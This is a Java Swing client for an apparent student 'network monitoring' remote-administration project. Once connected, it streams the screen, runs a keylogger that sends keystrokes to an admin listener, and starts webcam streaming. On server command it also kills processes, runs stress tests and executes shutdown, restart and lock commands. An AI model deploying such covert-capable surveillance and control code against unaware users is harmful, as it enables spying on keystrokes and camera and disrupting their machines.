package UI;
// giao diện của client

import config.ClientConfig; // file config để load các thông số mặc định như IP và Port của server
import java.awt.*;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.concurrent.LinkedBlockingQueue;
import javax.swing.*;
import network.Screen;
import network.SocketClient;
import service.keylogger.KeyloggerService;

public class UIClient extends JFrame {

    private SocketClient socketClient;
    private ServerSocket keylogServerSocket;;

    private volatile boolean isConnected = false;  // Track connection state
    private Screen screenStreamService = null;      // Lưu reference
    private java.util.List<Thread> activeThreads = new java.util.ArrayList<>();  // Track threads

    private final static String titleString="CLIENT AGENT";
    private final static int width=450;
    private final static int height=600;

    //bảng màu giống với bên UI của server
    private final static Color BG = new Color(7, 7, 8);
    private final static Color PANEL = new Color(15, 17, 20);
    private final static Color RED = new Color(239, 35, 49);
    private final static Color RED_DARK = new Color(120, 10, 18);
    private final static Color TEXT = new Color(240, 240, 240);
    private final static Color MUTED = new Color(165, 165, 165);
    private final static Color BORDER = new Color(80, 28, 32);

    private JTextField ipField;//ô nhập ip của server 
    private JTextField portField;//ô nhập port của server
    private JButton connectButton;//nút bấm connect
    private JLabel statusLabel; // hiển thị trạng thái kết nối với server

    private void startKeyloggerListener() {
        int port = ClientConfig.getInt("keylog_port", 1416);
 
        new Thread(() -> {
            try {
                keylogServerSocket = new ServerSocket(port);
                System.out.println("[KEYLOGGER] Listening on port " + port);
 
                while (!keylogServerSocket.isClosed()) {
                    Socket session = keylogServerSocket.accept();
                    System.out.println("[KEYLOGGER] Admin connected: "
                            + session.getInetAddress().getHostAddress());
                    new Thread(() -> handleKeylogSession(session), "Keylog-Session").start();
                }
 
            } catch (Exception e) {
                System.out.println("[KEYLOGGER] Listener stopped.");
            }
        }, "Keylog-Listener").start();
    }

    private void handleKeylogSession(Socket session) {
        KeyloggerService keyloggerService = null;
 
        try {
            DataInputStream  dis = new DataInputStream(session.getInputStream());
            DataOutputStream dos = new DataOutputStream(session.getOutputStream());
 
            // Đọc lệnh từ Admin
            String command = dis.readUTF();
            if (!command.equals("START")) {
                System.out.println("[KEYLOGGER] Lệnh không hợp lệ: " + command);
                session.close();
                return;
            }
 
            System.out.println("[KEYLOGGER] Nhận lệnh START — bắt đầu ghi phím");
 
            LinkedBlockingQueue<String> keyQueue = new LinkedBlockingQueue<>();
 
            keyloggerService = new KeyloggerService(keyQueue);
            keyloggerService.start();
 
            while (!session.isClosed()) {
                String key = keyQueue.take();
                if (key.equals("__STOP__")) break;
 
                byte[] bytes = key.getBytes("UTF-8");
                dos.writeInt(bytes.length);
                dos.write(bytes);
                dos.flush();
            }
 
        } catch (Exception e) {
            System.out.println("[KEYLOGGER] Session kết thúc: " + e.getMessage());
        } finally {
            if (keyloggerService != null) keyloggerService.stop();
            try { session.close(); } catch (Exception ignored) {}
            System.out.println("[KEYLOGGER] Đã dừng ghi phím");
        }
    }

    public UIClient() {
        setTitle(titleString);
        setSize(width,height);
        setLocationRelativeTo(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        // setResizable(false);
        getContentPane().setBackground(BG);
        setLayout(new BorderLayout());

        // Xây dựng các khu vực giao diện
        add(Header(),BorderLayout.NORTH);
        add(Center(),BorderLayout.CENTER);
        add(Footer(),BorderLayout.SOUTH);
    }

    private String getClientId() {
    try {
        String hostname = java.net.InetAddress.getLocalHost().getHostName();
        String ip = java.net.InetAddress.getLocalHost().getHostAddress();
        return hostname + "-" + ip;
    } catch (Exception e) {
        return "UNKNOWN";
    }
}

    // 1. KHU VỰC HEADER (Tiêu đề)
    private JPanel Header() {
        JPanel header=new JPanel(new BorderLayout());
        header.setBackground(BG);
        header.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(0,0, 2, 0, RED),
                BorderFactory.createEmptyBorder(20,20,20,20)
        ));
        JLabel title=new JLabel(titleString);
        title.setForeground(TEXT);//set màu text cho title
        Font fontTitle=new Font("Segoe UI",Font.BOLD,22);
        title.setFont(fontTitle);//set font cho title

        JLabel subTitle = new JLabel("Network Monitoring System");
        subTitle.setForeground(MUTED);
        Font fontSubTitle=new Font("Segoe UI",Font.PLAIN,12);
        subTitle.setFont(fontSubTitle);//set font cho subTitle

        JPanel textPanel = new JPanel(new GridLayout(2, 1));
        textPanel.setOpaque(false);
        textPanel.add(title);
        textPanel.add(subTitle);

        header.add(textPanel, BorderLayout.WEST);
        return header;
    }

    // 2. KHU VỰC TRUNG TÂM (Cấu hình & Thông tin)
    private JPanel Center() {
        JPanel center=new JPanel();
        center.setLayout(new BoxLayout(center,BoxLayout.Y_AXIS));
        center.setBackground(BG);
        center.setBorder(BorderFactory.createEmptyBorder(25, 30, 25, 30));

        center.add(connectionCard());
        center.add(Box.createVerticalStrut(20)); // Khoảng cách
        center.add(createSystemInfoCard());

        return center;
    }

    // --- Thẻ nhập IP và Port ---
    private JPanel connectionCard() {
        JPanel card = new JPanel(new BorderLayout(0, 15));
        card.setBackground(PANEL);
        card.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(BORDER, 1),
                BorderFactory.createEmptyBorder(20, 20, 20, 20)
        ));

        JLabel title = new JLabel("SERVER CONNECTION");
        title.setForeground(RED);
        title.setFont(new Font("Segoe UI", Font.BOLD, 14));

        JPanel inputPanel = new JPanel(new GridLayout(2, 2, 10, 15));
        inputPanel.setOpaque(false);

        JLabel ipLabel = new JLabel("Admin IP:");
        ipLabel.setForeground(TEXT);
        ipLabel.setFont(new Font("Segoe UI", Font.BOLD, 13));
        
        ipField = createTextField(
                ClientConfig.getString("server.ip", "127.0.0.1")
        );
        JLabel portLabel = new JLabel("Port:");
        portLabel.setForeground(TEXT);
        portLabel.setFont(new Font("Segoe UI", Font.BOLD, 13));
        
        portField = createTextField(
        ClientConfig.getString("server.port", "1412"));

        inputPanel.add(ipLabel);
        inputPanel.add(ipField);
        inputPanel.add(portLabel);
        inputPanel.add(portField);

        connectButton = new JButton("CONNECT TO SERVER");
        connectButton.setBackground(RED_DARK);
        connectButton.setForeground(Color.WHITE);
        connectButton.setFocusPainted(false);
        connectButton.setFont(new Font("Segoe UI", Font.BOLD, 14));
        connectButton.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(RED),
                BorderFactory.createEmptyBorder(10, 10, 10, 10)
        ));
        connectButton.setCursor(new Cursor(Cursor.HAND_CURSOR));

        // Bắt sự kiện bấm nút kết nối
        // connectButton.addActionListener(e -> {
        //     // Ở các bước sau, em sẽ gọi SocketClient ở đây
        //     String ip = ipField.getText();
        //     String port = portField.getText();
        //     System.out.println("Đang kết nối tới " + ip + ":" + port);
            
        //     // Giả lập đổi trạng thái
        //     statusLabel.setText("● STATUS: CONNECTING...");
        //     statusLabel.setForeground(Color.YELLOW);
        // });
        // Khai báo thêm một biến toàn cục ở đầu Class ConnectFrame


        connectButton.addActionListener(e -> {
            if (socketClient != null && socketClient.isConnected()) {
                // Nếu đã kết nối rồi thì thực hiện ngắt kết nối
                isConnected = false;
                socketClient.disconnect();

                try {
                    if (keylogServerSocket != null && !keylogServerSocket.isClosed()) {
                        keylogServerSocket.close();
                    }
                } catch (Exception ignored) {}

                if (screenStreamService != null) {
                    screenStreamService.stop();
                }


                statusLabel.setText("● STATUS: DISCONNECTED");
                statusLabel.setForeground(MUTED);
                connectButton.setText("CONNECT TO SERVER");
                connectButton.setEnabled(true);
                return;
            }
            String ip = ipField.getText();
            int port = Integer.parseInt(portField.getText());
    
            // Đổi trạng thái giao diện sang Đang chờ
            statusLabel.setText("● STATUS: CONNECTING...");
            statusLabel.setForeground(Color.YELLOW);
            connectButton.setEnabled(false); // Khóa nút bấm tạm thời để tránh user click đúp

            

            // Tạo một luồng riêng để đi kết nối mạng, tránh làm đơ giao diện
            new Thread(() -> {
                socketClient = new SocketClient();
                boolean Connected = socketClient.connectServer(ip, port);
        
                // Dùng SwingUtilities để cập nhật lại giao diện sau khi kết nối xong
                SwingUtilities.invokeLater(() -> {
                    if (Connected) {
                        isConnected = true;
                        statusLabel.setText("● STATUS: CONNECTED TO " + ip);
                        statusLabel.setForeground(Color.GREEN);
                        connectButton.setText("DISCONNECT");
                        connectButton.setEnabled(true);

                        startServerMessageListener();
                
                        // TODO: Gọi SystemInfoService để thu thập thông tin máy gửi đi
                        // TODO: Kích hoạt CommandReceiver để ngồi hóng lệnh
                        

                        screenStreamService = new Screen(socketClient.getDos());
                        screenStreamService.start();
                        startKeyloggerListener();
                    } else {
                        statusLabel.setText("● STATUS: CONNECTION FAILED!");
                        statusLabel.setForeground(RED);
                        connectButton.setEnabled(true);
                    }
                });
            }).start();
        });

        card.add(title, BorderLayout.NORTH);
        card.add(inputPanel, BorderLayout.CENTER);
        card.add(connectButton, BorderLayout.SOUTH);

        return card;
    }

    // --- Thẻ hiển thị thông tin máy tự động quét ---
    private JPanel createSystemInfoCard() {
        JPanel card = new JPanel(new GridLayout(4, 1, 5, 10));
        card.setBackground(PANEL);
        card.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(BORDER, 1),
                BorderFactory.createEmptyBorder(15, 20, 15, 20)
        ));

        JLabel title = new JLabel("LOCAL MACHINE INFO");
        title.setForeground(RED);
        title.setFont(new Font("Segoe UI", Font.BOLD, 14));
        card.add(title);

        // Tự động lấy thông tin máy tính bằng code Java
        String hostName = "Unknown";
        String localIp = "Unknown";
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            hostName = localHost.getHostName();
            localIp = localHost.getHostAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        String osName = System.getProperty("os.name");

        card.add(createInfoLabel("▦ Hostname: " + hostName));
        card.add(createInfoLabel("◴ OS: " + osName));
        card.add(createInfoLabel("◎ Local IP: " + localIp));

        return card;
    }

    // 3. KHU VỰC FOOTER (Trạng thái)
    private JPanel Footer() {
        JPanel footer = new JPanel(new FlowLayout(FlowLayout.CENTER));
        footer.setBackground(BG);
        // footer.setBorder(BorderFactory.createMatteBorder(1, 0, 0, 0, BORDER));
        footer.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createMatteBorder(2,0,0,0,BORDER)
            ,BorderFactory.createEmptyBorder(5,0,5,0)));
        statusLabel = new JLabel("● STATUS: DISCONNECTED");
        statusLabel.setForeground(MUTED);
        Font fontStatus=new Font("segoe UI",Font.BOLD,12);
        statusLabel.setFont(fontStatus);

        footer.add(statusLabel);
        return footer;
    }

    // --- CÁC HÀM TIỆN ÍCH DÙNG CHUNG ---

    private JTextField createTextField(String defaultText) {
        JTextField field = new JTextField(defaultText);
        field.setBackground(new Color(8, 9, 11));
        field.setForeground(TEXT);
        field.setCaretColor(RED);
        field.setFont(new Font("Consolas", Font.PLAIN, 14));
        field.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(BORDER),
                BorderFactory.createEmptyBorder(5, 10, 5, 10)
        ));
        return field;
    }

    private JLabel createInfoLabel(String text) {
        JLabel label = new JLabel(text);
        label.setForeground(TEXT);
        label.setFont(new Font("Segoe UI", Font.PLAIN, 13));
        return label;
    }

    private void startServerMessageListener() {
    new Thread(() -> {
        try {
            while (socketClient != null && socketClient.isConnected()) {
                try {
                    String message = socketClient.getDis().readUTF();
                    System.out.println("[CLIENT] Received: " + message);

                    if (message.startsWith("BROADCAST|")) {
                        String text = message.substring("BROADCAST|".length());
                        SwingUtilities.invokeLater(() -> {
                            JOptionPane.showMessageDialog(UIClient.this, text, "Broadcast", JOptionPane.INFORMATION_MESSAGE);
                        });
                    } 
                    else if (message.startsWith("POWER|")) {
                        String cmdType = message.substring("POWER|".length());
                        System.out.println("[CLIENT] Nhận lệnh điều khiển nguồn: " + cmdType);
                        executePowerCommand(cmdType);
                    }
                    else if (message.equals("WEBCAM_START")) {
                        Thread webcamThread = new Thread(() -> {
                            try {
                                if (!isConnected) return;
                                
                                Socket ws = new Socket(socketClient.getServerIp(), 1413);
                                DataOutputStream dos = new DataOutputStream(ws.getOutputStream());
                                dos.writeUTF(socketClient.getClientName());
                                dos.flush();
                                
                                features.WebcamClientDemo webcam = new features.WebcamClientDemo();
                                webcam.startWebcamStream(ws);
                            } catch (Exception ex) {
                                System.out.println("[WEBCAM-CLIENT] ERROR: " + ex.getMessage());
                            }
                        });
                        webcamThread.start();
                        activeThreads.add(webcamThread);  // ← Track it
                    }
                    else if (message.equals("TASK_MANAGER_START")) {
                        new Thread(() -> {
                            try {
                                Socket ts = new Socket(socketClient.getServerIp(), 1414);
                                DataOutputStream dos = new DataOutputStream(ts.getOutputStream());
                                dos.writeUTF(socketClient.getClientName());
                                dos.flush();
                                features.taskmanager.TaskCommandHandler handler = new features.taskmanager.TaskCommandHandler(ts);
                                new Thread(handler).start();
                            } catch (Exception ex) {
                                System.out.println("[TASK-CLIENT] ERROR: " + ex.getMessage());
                            }
                        }).start();
                    }
                    else if (message.equals("GET_PROCESS_LIST")) {
                        System.out.println("[CLIENT] Server requesting process list");
                    }
                    else if (message.startsWith("KILL_PROCESS|")) {
                        String pid = message.substring("KILL_PROCESS|".length());
                        new features.taskmanager.ProcessService().killProcess(pid);
                    }
                    else if (message.startsWith("START_STRESS_TEST|")) {
                        String[] parts = message.split("\\|");
                        String testType = parts.length > 1 ? parts[1] : "CPU";
                        String intensity = parts.length > 2 ? parts[2] : "50";

                        System.out.println("[STRESS-CLIENT] Start: " + testType + " " + intensity);

                        new Thread(() -> {
                            try {
                                System.out.println("[STRESS-CLIENT] Connecting to port 1417...");
                                Socket stressSocket = new Socket(socketClient.getServerIp(), 1417);
                                DataOutputStream stressDos = new DataOutputStream(stressSocket.getOutputStream());
                                System.out.println("[STRESS-CLIENT] Connected!");
                                stressDos.writeUTF(socketClient.getClientName());
                                stressDos.flush();
                                System.out.println("[STRESS-CLIENT] Sent client name");
                                features.StressTestService stressTest = new features.StressTestService(stressDos);
                                
                                if ("CPU".equalsIgnoreCase(testType)) {
                                    stressTest.startCpuStress(Integer.parseInt(intensity));
                                } else if ("MEMORY".equalsIgnoreCase(testType)) {
                                    stressTest.startMemoryStress(Integer.parseInt(intensity));
                                } else if ("DISK".equalsIgnoreCase(testType)) {
                                    stressTest.startDiskStress(Integer.parseInt(intensity));
                                }
                            } catch (Exception ex) {
                                System.out.println("[STRESS-CLIENT] Error: " + ex.getMessage());
                                ex.printStackTrace();
                            }
                        }).start();
                    }

                    else if (message.equals("STOP_STRESS_TEST")) {
                        System.out.println("[STRESS-CLIENT] Stopping...");
                    }
                    else {
                        System.out.println("[CLIENT] Unknown: " + message);
                    }
                    
                } catch (java.io.EOFException e) {
                    System.out.println("[CLIENT] Server closed connection");
                    handleServerDisconnect();
                    break;
                }
            }
        } catch (Exception e) {
            System.out.println("[CLIENT] Listener error: " + e.getMessage());
            handleServerDisconnect();
        }
    }).start();
}

        
    private void executePowerCommand(String type) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) { // Kiểm tra nếu máy khách chạy Windows
                switch (type) {
                    case "LOCK":
                        Runtime.getRuntime().exec("rundll32.exe user32.dll,LockWorkStation");
                        break;
                    case "RESTART":
                        Runtime.getRuntime().exec("shutdown /r /t 0");
                        break;
                    case "SHUTDOWN":
                        Runtime.getRuntime().exec("shutdown /s /t 0");
                        break;
                    case "SLEEP":
                        Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
                        break;
                    default:
                        System.out.println("[CLIENT] Lệnh nguồn không hợp lệ: " + type);
                        break;
                }
            } else {
                System.out.println("[CLIENT] Chỉ hỗ trợ điều khiển nguồn trên Windows.");
            }
        } catch (Exception e) {
            System.out.println("[CLIENT LỖI] Lỗi thực thi lệnh điều khiển nguồn: " + e.getMessage());
        }
    }


    private void handleServerDisconnect() {
    System.out.println("[CLIENT] Server disconnected, resetting UI...");
    isConnected = false;
    
    SwingUtilities.invokeLater(() -> {
        
        
        if (screenStreamService != null) {
            screenStreamService.stop();
            screenStreamService = null;
        }

        for (Thread t : activeThreads) {
            if (t != null && t.isAlive()) {
                t.interrupt();  // Interrupt thread
            }
        }
        activeThreads.clear();
        
        try {
            if (keylogServerSocket != null && !keylogServerSocket.isClosed()) {
                keylogServerSocket.close();
            }
        } catch (Exception ignored) {}

        statusLabel.setText("● STATUS: DISCONNECTED");
        statusLabel.setForeground(MUTED);
        
        connectButton.setText("CONNECT TO SERVER");
        connectButton.setEnabled(true);

        if (socketClient != null) {
            socketClient.disconnect();
        }
        
        System.out.println("[CLIENT] UI reset complete");
    });
}
    // Hàm Main khởi động để test thử UI
    public void run(){
        SwingUtilities.invokeLater(() -> {
            try {
                //Ép giao diện Cross-Platform (Metal) để nút bấm không bị bo tròn kiểu Windows
                UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
            } catch (Exception ignored) {}

            new UIClient().setVisible(true);
        });
    }
    
}